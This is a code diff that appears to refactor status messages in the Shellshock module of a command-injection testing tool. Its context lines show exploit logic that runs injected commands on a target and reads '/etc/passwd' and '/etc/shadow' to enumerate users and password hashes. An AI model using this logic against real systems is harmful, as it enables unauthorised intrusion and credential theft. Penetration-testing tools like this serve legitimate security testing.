@@ -200,7 +200,7 @@ def enumeration(url, cve, check_header, filename):
     cmd = settings.SYS_USERS             
     sys_users, payload = cmd_exec(url, cmd, cve, check_header, filename)
     info_msg = "Fetching '" + settings.PASSWD_FILE 
-    info_msg += "' to enumerate users entries... "  
+    info_msg += "' to enumerate users entries. "  
     sys.stdout.write(settings.print_info_msg(info_msg))
     sys.stdout.flush()
     try:
@@ -212,7 +212,7 @@ def enumeration(url, cve, check_header, filename):
           sys_users = sys_users.split(" ")
         # Check for appropriate '/etc/passwd' format.
         if len(sys_users) % 3 != 0 :
-          sys.stdout.write("[ " + Fore.RED + "FAILED" + Style.RESET_ALL + " ]")
+          sys.stdout.write(settings.FAIL_STATUS)
           sys.stdout.flush()
           warn_msg = "It seems that '" + settings.PASSWD_FILE 
           warn_msg += "' file is not in the appropriate format. Thus, it is expoted as a text file." 
@@ -227,7 +227,7 @@ def enumeration(url, cve, check_header, filename):
           for user in range(0, len(sys_users), 3):
              sys_users_list.append(sys_users[user : user + 3])
           if len(sys_users_list) != 0 :
-            sys.stdout.write("[ " + Fore.GREEN + "SUCCEED" + Style.RESET_ALL + " ]")
+            sys.stdout.write(settings.SUCCESS_STATUS)
             success_msg = "Identified " + str(len(sys_users_list)) 
             success_msg += " entr" + ('ies', 'y')[len(sys_users_list) == 1] 
             success_msg += " in '" +  settings.PASSWD_FILE + "'.\n"
@@ -288,18 +288,18 @@ def enumeration(url, cve, check_header, filename):
                 output_file.write("      " + sys_users)
                 output_file.close()
       else:
-        sys.stdout.write("[ " + Fore.RED + "FAILED" + Style.RESET_ALL + " ]")
+        sys.stdout.write(settings.FAIL_STATUS)
         sys.stdout.flush()
         warn_msg = "It seems that you don't have permissions to read '" 
         warn_msg += settings.PASSWD_FILE + "' to enumerate users entries."
         print("\n" + settings.print_warning_msg(warn_msg))   
     except TypeError:
-      sys.stdout.write("[ " + Fore.RED + "FAILED" + Style.RESET_ALL + " ]\n")
+      sys.stdout.write(settings.FAIL_STATUS + "\n")
       sys.stdout.flush()
       pass
 
     except IndexError:
-      sys.stdout.write("[ " + Fore.RED + "FAILED" + Style.RESET_ALL + " ]")
+      sys.stdout.write(settings.FAIL_STATUS)
       warn_msg = "Some kind of WAF/IPS/IDS probably blocks the attempt to read '" 
       warn_msg += settings.PASSWD_FILE + "' to enumerate users entries." 
       sys.stdout.write("\n" + settings.print_warning_msg(warn_msg))
@@ -319,10 +319,10 @@ def enumeration(url, cve, check_header, filename):
       sys_passes = sys_passes.split( )
       if len(sys_passes) != 0 :
         info_msg = "Fetching '" + settings.SHADOW_FILE 
-        info_msg += "' to enumerate users password hashes... "  
+        info_msg += "' to enumerate users password hashes. "  
         sys.stdout.write(settings.print_info_msg(info_msg))
         sys.stdout.flush()
-        sys.stdout.write("[ " + Fore.GREEN + "SUCCEED" + Style.RESET_ALL + " ]")
+        sys.stdout.write(settings.SUCCESS_STATUS)
         success_msg = "Identified " + str(len(sys_passes))
         success_msg += " entr" + ('ies', 'y')[len(sys_passes) == 1] 
         success_msg += " in '" +  settings.SHADOW_FILE + "'.\n"
@@ -622,7 +622,7 @@ def shellshock_handler(url, http_request_method, filename):
   injection_type = "results-based command injection"
   technique = "shellshock injection technique"
 
-  info_msg = "Testing the " + technique + "... "
+  info_msg = "Testing the " + technique + ". "
   if settings.VERBOSITY_LEVEL > 1:
     info_msg = info_msg + "\n"
   sys.stdout.write(settings.print_info_msg(info_msg))
@@ -669,24 +669,24 @@ def shellshock_handler(url, http_request_method, filename):
         
         if str(float_percent) == "100.0":
           if no_result == True:
-            percent = Fore.RED + "FAILED" + Style.RESET_ALL
+            percent = settings.FAIL_STATUS
           else:
-            percent = Fore.GREEN + "SUCCEED" + Style.RESET_ALL
+            percent = settings.SUCCESS_MSG
             no_result = False
 
         elif len(response.info()) > 0 and cve in response.info():
-          percent = Fore.GREEN + "SUCCEED" + Style.RESET_ALL
+          percent = settings.SUCCESS_MSG
           no_result = False
 
         elif len(response.read()) > 0 and cve in response.read():
-          percent = Fore.GREEN + "SUCCEED" + Style.RESET_ALL
+          percent = settings.SUCCESS_MSG
           no_result = False
 
         else:
-          percent = str(float_percent )+ "%"
+          percent = str(float_percent)+ "%"
 
         if not settings.VERBOSITY_LEVEL >= 1:
-          info_msg = "Testing the " + technique + "... " +  "[ " + percent + " ]"
+          info_msg = "Testing the " + technique + "." + "" + percent + ""
           sys.stdout.write("\r" + settings.print_info_msg(info_msg))
           sys.stdout.flush()
 
@@ -821,7 +821,7 @@ def shellshock_handler(url, http_request_method, filename):
                         logs.executed_command(filename, cmd, shell)
                         print("\n" + Fore.GREEN + Style.BRIGHT + shell + Style.RESET_ALL + "\n")
                       else:
-                        info_msg = "Executing the '" + cmd + "' command... "
+                        info_msg = "Executing the '" + cmd + "' command. "
                         if settings.VERBOSITY_LEVEL == 1:
                           sys.stdout.write(settings.print_info_msg(info_msg))
                           sys.stdout.flush()
@@ -846,7 +846,7 @@ def shellshock_handler(url, http_request_method, filename):
                     raise
 
                   except:
-                    info_msg = "Testing the " + technique + "... "
+                    info_msg = "Testing the " + technique + ". "
                     if settings.VERBOSITY_LEVEL > 1:
                       info_msg = info_msg + "\n"
                     sys.stdout.write(settings.print_info_msg(info_msg))
@@ -914,7 +914,7 @@ def cmd_exec(url, cmd, cve, check_header, filename):
       TAG = ''.join(random.choice(string.ascii_uppercase) for i in range(6))
       cmd = "echo " + TAG + "$(" + cmd + ")" + TAG
       payload = shellshock_exploitation(cve, cmd)
-      info_msg = "Executing the '" + cmd + "' command... "
+      info_msg = "Executing the '" + cmd + "' command. "
       if settings.VERBOSITY_LEVEL == 1:
         sys.stdout.write(settings.print_info_msg(info_msg))
       elif settings.VERBOSITY_LEVEL > 1:
